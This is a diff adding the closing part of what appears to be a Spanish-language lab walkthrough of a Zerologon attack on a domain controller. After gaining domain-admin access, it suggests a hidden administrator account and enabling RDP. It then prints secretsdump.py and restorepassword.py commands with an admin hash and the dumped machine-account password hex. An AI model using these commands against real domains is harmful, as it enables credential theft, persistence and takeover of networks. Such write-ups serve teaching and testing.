@@ -111,6 +111,43 @@ cmd de la cuenta del administrador del dominio.
 
 ![](/assets/images/Zerologon/pth.png)
 
-Vemos que al ejecutar whoami nos devuelve dom01\administrador
+Vemos que al ejecutar whoami nos devuelve dom01\administrador. Estamos dentro
+de la máquina con la cuenta del administrador del dominio. En éste punto
+podemos hacer lo que queramos, por ejemplo crearnos un usuario administrador
+oculto para que no se vea desde windows, activar el escritorio remoto editando
+el registro con los comandos reg y conectarnos por RDP al servidor.
+
+Pero no nos olvidemos de que tenemos que restablecer la contraseña de la cuenta
+de quipo para que todo funcione correctamente a nivel de active directory. Esto
+es debido a que hemos cambiado la contraseña de la cuenta del equipo a nivel de
+active directory, pero en la sam local sigue estando la original.
+
+Para restablecerla usaremos de nuevo secretsdump pero esta vez con el hash del
+administrador, lo que nos devolverá la *plain_password_hex* original para poder
+restablecerla con el script restorepassword.py
+
+```
+secretsdump.py dom01.local/administrador@192.168.160.131 -target-ip 192.168.160.131 -hashes :57987b38d5ba54e02daa2d5d7579765b
+```
+
+Nos devuelve entre otras cosas la plain_password_hex de la cuenta de equipo en
+la sam local.
+
+```
+DOM01\DC01$:plain_password_hex:fc3547348ef0ff05e8427168cd24be642dc407bf1d352de423fe0651b653ce853d7e37c957bd504444cd6898b301f56c00061671e25c11ddcf3890ef8b8bfcc41c8672fa708c4aa5981d8a1006288e7938887597eef55c630b37d5ddcd5635237f0b9be59944353f7ac163f60ad134c4f9506f768c49a33beda57a039e2a50d2d022c50a3d488998ee7f6cf2861c82bba15a67121c896fd479dc2688a6a2400b3a0c49ae1af1909672033929927e38e91fbe1a01e6d4ee15a381b6ccc42cdcc578fad4630161d429bc63fc7376e5debc403afba544390b42592408bb44c47e6da38b111d98d9cb9fadbfa89bb2936f53
+```
+
+Solo quedaría ejecutar el script para restablecer la contraseña local de la
+cuenta de equipo.
+
+```
+sudo python3 restorepassword.py dom01.local/DC01@DC01 -target-ip 192.168.160.131 -hexpass fc3547348ef0ff05e8427168cd24be642dc407bf1d352de423fe0651b653ce853d7e37c957bd504444cd6898b301f56c00061671e25c11ddcf3890ef8b8bfcc41c8672fa708c4aa5981d8a1006288e7938887597eef55c630b37d5ddcd5635237f0b9be59944353f7ac163f60ad134c4f9506f768c49a33beda57a039e2a50d2d022c50a3d488998ee7f6cf2861c82bba15a67121c896fd479dc2688a6a2400b3a0c49ae1af1909672033929927e38e91fbe1a01e6d4ee15a381b6ccc42cdcc578fad4630161d429bc63fc7376e5debc403afba544390b42592408bb44c47e6da38b111d98d9cb9fadbfa89bb2936f53
+```
+
+![](/assets/images/Zerologon/restore.png)
+
+Para comprobar si todo ha ido bien podemos ejecutar de nuevo nuestra primera
+ejecución de secretsdump y esta vez debería dar error al no estar la contraseña
+de la cuenta del equipo vacía.
 
 
